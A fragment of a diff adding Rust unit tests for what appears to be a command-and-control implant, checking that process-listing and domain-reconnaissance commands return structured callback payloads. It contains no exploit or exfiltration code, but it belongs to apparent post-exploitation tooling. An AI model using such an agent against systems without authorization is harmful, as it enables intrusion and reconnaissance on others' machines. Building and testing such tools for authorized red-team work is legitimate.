+        let mut state = PhantomState::default();
+
+        execute(&package, &mut state).await.expect("execute");
+
+        let callbacks = state.drain_callbacks();
+        let [PendingCallback::Structured { command_id, request_id, payload }] =
+            callbacks.as_slice()
+        else {
+            panic!("unexpected callbacks: {callbacks:?}");
+        };
+        assert_eq!(*command_id, u32::from(DemonCommand::CommandProcList));
+        assert_eq!(*request_id, 7);
+
+        let mut offset = 0;
+        assert_eq!(read_u32(payload, &mut offset), 0);
+        assert!(offset < payload.len());
+    }
+
+    #[tokio::test]
+    async fn net_domain_returns_structured_payload() {
+        let package = DemonPackage::new(
+            DemonCommand::CommandNet,
+            8,
+            (DemonNetCommand::Domain as i32).to_le_bytes().to_vec(),
+        );
+        let mut state = PhantomState::default();
+
+        execute(&package, &mut state).await.expect("execute");
+
+        let callbacks = state.drain_callbacks();
+        let [PendingCallback::Structured { command_id, request_id, payload }] =
+            callbacks.as_slice()
+        else {
+            panic!("unexpected callbacks: {callbacks:?}");
+        };
+        assert_eq!(*command_id, u32::from(DemonCommand::CommandNet));
+        assert_eq!(*request_id, 8);
+
+        let mut offset = 0;
+        assert_eq!(read_u32(payload, &mut offset), u32::from(DemonNetCommand::Domain));
+        let _domain = std::str::from_utf8(read_bytes(payload, &mut offset)).expect("utf8");
     }
 
     #[tokio::test]
